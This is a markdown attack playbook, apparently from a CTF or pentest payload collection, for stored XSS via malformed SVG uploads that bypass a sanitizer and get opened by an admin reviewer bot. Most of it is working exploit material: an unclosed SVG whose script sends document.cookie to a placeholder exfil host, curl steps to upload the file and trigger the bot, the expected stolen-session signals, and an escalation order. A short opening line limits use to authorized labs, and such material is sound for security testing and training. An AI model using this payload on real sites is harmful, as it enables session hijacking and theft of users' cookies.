# Malformed SVG Parser-Failure Upload XSS

## Context

Use in authorized labs, owned apps, in-scope targets, or defensive validation.

Apply when:

- the app accepts `.svg` / `image/svg+xml` uploads
- well-formed SVG with `<script>` is sanitized
- copy or behavior suggests unreadable uploads are stored unchanged
- a review/admin bot opens `/items/<hash>.svg` or similar file URLs
- `POST /api/send` or equivalent accepts an upload hash

## Requirements

- Out-of-band collaborator such as OAST, webhook, or Keeper/Subkeeper log sink
- Do not store live flags, cookies, tokens, or private URLs in reusable files

## Minimal Payload

Use **malformed** SVG so the server parser fails and skips sanitization:

```xml
<svg xmlns="http://www.w3.org/2000/svg"><script>
fetch('https://[collaborator]/?c='+encodeURIComponent(document.cookie))
</script>
```

Notes:

- intentionally leave the document unclosed
- do not wrap the script in CDATA unless needed for a specific filter
- replace `[collaborator]` with OAST payload host or other exfil endpoint

## Upload

```bash
curl -sS -X POST "https://[host]/api/upload" \
  -F "file=@bad.svg;filename=bad.svg;type=image/svg+xml"
```

Expected response shape:

```json
{
  "hash": "...",
  "url": "/items/[hash].svg",
  "ext": "svg"
}
```

## Verify Stored Object

```bash
curl -i "https://[host]/items/[hash].svg"
```

Useful signals:

```http
Content-Type: text/html
```

Body still contains the `<script>` payload.

## Trigger Reviewer Bot

```bash
curl -sS -X POST "https://[host]/api/send" \
  -H "Content-Type: application/json" \
  -d '{"hash":"[hash]"}'
```

Alternate endpoint names:

```text
/api/report
/api/review
/api/visit
```

## Expected Collaborator Signal

```text
GET /?c=FLAG=...
GET /?c=session=...
```

## Why It Works

The sanitizer appears to run only on readable SVG/XML. Parser failure stores the original bytes, and the app may serve the broken file as `text/html` from the first-party origin. The reviewer bot then executes embedded script in its own session.

## Why It Fails

- malformed uploads are rejected outright
- parser-failure files are still served as inert types
- sanitizer runs on a fallback path even when parsing fails
- uploads are isolated from app cookies
- reviewer bot does not open the raw file URL

## Common Mistakes

- using well-formed SVG first and concluding SVG is fully patched
- spending time on PNG polyglots before testing parser-failure SVG
- uploading successfully but never calling the reviewer endpoint
- checking only upload success, not stored `Content-Type` and body
- using `alert(1)` when the lab needs cookie exfil from a bot session

## Escalation Order

1. Well-formed SVG with `<script>` — confirm sanitizer exists
2. Malformed / unclosed SVG with same script — test parser-failure path
3. Inspect stored headers and body
4. Trigger reviewer bot
5. If SVG path fails, test PNG polyglot
6. If object-storage clues exist, test `?response-content-type=text/html`

## Related Patterns

- `payloads/xss/svg-upload-curator-bot.md` — direct unsanitized SVG case
- `payloads/xss/png-s3-response-content-type-xss.md` — raster polyglot case
- `notes/upload-parser-failure-svg-left-alone.md` — concept note
